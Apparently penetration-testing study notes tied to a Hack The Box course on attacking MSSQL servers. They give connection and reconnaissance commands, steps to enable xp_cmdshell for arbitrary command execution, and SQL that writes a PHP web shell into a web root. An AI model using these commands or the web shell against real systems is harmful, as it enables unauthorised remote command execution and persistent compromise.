Usual Port: 1433

Common Action:

-Connecting to MSSQL using impacket-mssqlclient
```
impacket-mssqlclient <username>@<ip> -windows-auth
#or
python3 mssqlclient.py <username>@<ip> -windows-auth
```
Alternative - Use sqsh:
```
sqsh -S <ip> -U <username> -P '<password>' -h
```
Automated Tools:

-Using nmap for script scan:
```
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=<port>,mssql.username=<username>,mssql.password=<password/blank>,mssql.instance-name=<instancename> -sV -p <port> <ip>
```

-Using Metasploit for recon:
```
#in msfconsole
use scanner/mssql/mssql_ping
set rhosts <ip>
exploit
```

Post Entry:

We can use xp_cmdshell to execute arbitrary command:
```
xp_cmdshell '<command>'
#Example
xp_cmdshell 'whoami'
```

If it is not enabled, we can also enable it:
```
#In msssqlclient:
enable xp_cmdshell
#Native:
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure'xp_cmdshell', 1
RECONFIGURE
```

We can enable OLE Automation Procedures to allow file creation:
```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
After that, we can create file with MSSQL:
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<path_to_file>', 8, 1
4Example> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```



Ref: https://academy.hackthebox.com/app/module/112/section/1246